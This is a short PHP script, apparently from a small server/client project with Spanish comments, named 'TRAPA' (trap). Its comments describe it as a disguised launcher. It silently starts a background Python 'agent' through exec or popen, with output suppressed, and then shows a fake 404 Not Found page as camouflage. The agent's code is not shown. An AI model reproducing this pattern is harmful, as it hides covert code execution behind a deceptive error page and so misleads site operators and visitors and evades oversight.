<?php
/**
 * TRAPA.PHP - Lanzador simulado
 * Este script simula una página de error 404 mientras ejecuta 
 * el agente en segundo plano.
 */

// 1. Definir la ruta absoluta al agente
// __DIR__ nos da la ruta de la carpeta 'server'
// '/../client/agente.py' sube un nivel y entra en 'client'
$agente_path = __DIR__ . '/../client/agente.py';

// 2. Ejecutar el agente de forma silenciosa y en segundo plano
if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
    // Comando para Windows: lanza el proceso sin esperar a que termine (B)
    // Usamos 'pythonw' si quieres que sea totalmente invisible
    pclose(popen("start /B python \"$agente_path\"", "r"));
} else {
    // Comando para Linux/Mac
    exec("python3 \"$agente_path\" > /dev/null 2>&1 &");
}

// 3. Camuflaje: Mostrar un error 404 estándar
header("HTTP/1.1 404 Not Found");
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>404 Not Found</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 150px; background: #fff; color: #000; }
        h1 { font-size: 50px; }
        p { font-size: 20px; }
        hr { max-width: 500px; border: 0; border-top: 1px solid #eee; }
    </style>
</head>
<body>
    <h1>404 Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    <hr>
    <address>Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 Server at localhost Port 80</address>
</body>
</html>